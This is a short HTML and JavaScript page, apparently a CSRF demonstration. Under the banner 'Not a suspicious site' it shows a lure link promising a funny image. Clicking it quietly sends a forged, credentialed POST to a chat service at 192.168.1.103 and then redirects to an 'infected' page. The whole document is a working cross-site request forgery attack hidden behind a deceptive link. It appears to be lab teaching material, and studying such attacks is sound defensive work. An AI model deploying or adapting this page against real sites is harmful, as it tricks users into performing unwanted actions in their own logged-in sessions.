<h1>?? 怪しくないサイト ??</h1>
<a href="kansen.html" id="link" target="_blank">超面白い画像はこちら！このボタンを押してみてね→</a>
<form novalidate="novalidate" style="display: none;" method="get" name = "trap">
	<input type="hidden" name="body" value=
		<?php
      echo "感染したお";
    ?>
  >
</form>

<script>
  const targetURL = 'http://192.168.1.103/chat';
  const link = document.getElementById('link');
  link.addEventListener('click', function(e) {
    e.preventDefault();

    const formData = new FormData();
    formData.append('body', '罠サイトからこんにちは');

    const fetchOption = {
      method: 'POST',
      mode: 'no-cors',
      credentials: 'include',
      body: formData
    };

    fetch(targetURL, fetchOption).then(() => {
      location.href = 'kansen.html';
    });
  });
</script>

